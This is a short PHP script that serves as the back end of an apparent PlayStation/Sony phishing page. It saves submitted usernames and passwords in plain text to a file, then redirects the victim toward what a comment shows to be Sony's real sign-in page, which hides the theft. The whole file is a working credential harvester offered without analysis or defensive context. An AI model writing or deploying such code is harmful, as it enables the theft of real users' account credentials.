<?php

file_put_contents("usernames.txt", "Playstation Username: " . $_POST['username'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://id.sonyentertainmentnetwork.com/signin/?
header("Location: $url");
exit();
?>